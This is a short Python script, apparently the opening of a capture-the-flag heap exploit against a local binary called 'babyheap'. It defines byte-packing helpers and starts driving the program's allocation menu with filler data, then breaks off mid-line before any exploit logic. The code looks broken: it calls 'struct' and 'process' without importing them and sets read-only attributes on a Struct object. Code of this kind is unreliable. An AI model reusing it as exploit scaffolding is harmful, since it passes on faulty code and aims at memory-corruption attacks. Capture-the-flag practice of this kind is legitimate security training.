from _struct import Struct
s = Struct.__new__(Struct)
s.format = '<L'
s.size = 4

def p32(n):
    return s.pack(n)

def u32(n):
    return s.unpack(n)[0]

def p64(n):
    return struct.pack('<Q', n)

def u64(n):
    return struct.unpack('<Q', n)[0]

def fit(d, s):
    if len(d) >= s:
        return d[:s]
    return d + '\x00' * (s - len(d))

def main():
    r = process('./babyheap')
    r.recvuntil('Command: ')
    r.sendline('1')
    r.recvuntil('Size: ')
    r.sendline('0x20')
    r.recvuntil('Data: ')
    r.sendline('A' * 0x20)
    r.recvuntil('Command: ')
    r.sendline('1')
    r.recvuntil
